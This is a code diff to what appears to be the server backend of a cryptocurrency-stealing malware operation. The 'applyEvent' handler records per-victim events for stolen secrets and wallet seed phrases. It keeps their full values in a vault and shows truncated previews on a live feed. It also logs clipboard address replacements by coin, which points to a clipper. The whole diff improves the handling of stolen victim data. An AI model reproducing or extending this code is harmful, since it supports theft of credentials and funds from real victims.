@@ -51,8 +51,13 @@ export async function applyEvent(victimId: string, event: EventInput): Promise<v
   const { kind, data } = event;
   const value = text(data.value, 8192);
   const hash = value ? createHash('sha256').update(value).digest('hex') : '';
+  // The full value lives in the vault; events only keep a hash and a preview.
+  const safeData: Record<string, unknown> = { ...data };
+  if (hash) {
+    delete safeData.value;
+    safeData.preview = previewValue(kind, value);
+  }
   // Seed and memory-secret echoes collapse onto one row per value per day.
-  // The full value stays in the vault; the event only carries the hash.
   if (hash && (kind === 'secret_found' || kind === 'seed_found')) {
     const since = new Date(Date.now() - 24 * 3600_000);
     const existing = await prisma.event.findFirst({
@@ -64,17 +69,17 @@ export async function applyEvent(victimId: string, event: EventInput): Promise<v
       const count = Number(previous.count ?? 1) + 1;
       await prisma.event.update({
         where: { id: existing.id },
-        data: { data: { ...previous, hash, count, lastSeenAt: new Date().toISOString() } as never }
+        data: { data: { ...previous, ...safeData, hash, count, lastSeenAt: new Date().toISOString() } as never }
       });
       await storeSecret(victimId, kind, data, value);
-      void publish({ type: 'event.new', victimId, at: Date.now(), data: { kind, ...data, hash, count, legacy: event.legacy } });
+      void publish({ type: 'event.new', victimId, at: Date.now(), data: { kind, ...safeData, hash, count, legacy: event.legacy } });
       return;
     }
     const created = await prisma.event.create({
-      data: { victimId, kind, data: { ...data, hash, count: 1 } as never, legacy: event.legacy }
+      data: { victimId, kind, data: { ...safeData, hash, count: 1 } as never, legacy: event.legacy }
     });
     await storeSecret(victimId, kind, data, value);
-    void publish({ type: 'event.new', victimId, at: Date.now(), data: { kind, ...data, hash, count: 1, id: created.id, legacy: event.legacy } });
+    void publish({ type: 'event.new', victimId, at: Date.now(), data: { kind, ...safeData, hash, count: 1, id: created.id, legacy: event.legacy } });
   } else {
     await prisma.event.create({ data: { victimId, kind, data: data as never, legacy: event.legacy } });
     void publish({ type: 'event.new', victimId, at: Date.now(), data: { kind, ...data, legacy: event.legacy } });
@@ -91,6 +96,11 @@ export async function applyEvent(victimId: string, event: EventInput): Promise<v
     const original = text(data.original, 256);
     if (original) await recordClipboard(victimId, text(data.coin, 16) || 'replace', original, text(data.replacement, 256) || null);
   }
+}
+
+function previewValue(kind: string, value: string): string {
+  if (kind === 'seed_found') return `${value.trim().split(/\s+/).slice(0, 2).join(' ')} … ${value.trim().split(/\s+/).at(-1) ?? ''}`;
+  return value.length > 18 ? `${value.slice(0, 8)}…${value.slice(-6)}` : value;
 }
 
 async function storeSecret(victimId: string, kind: string, data: Record<string, unknown>, value: string): Promise<void> {
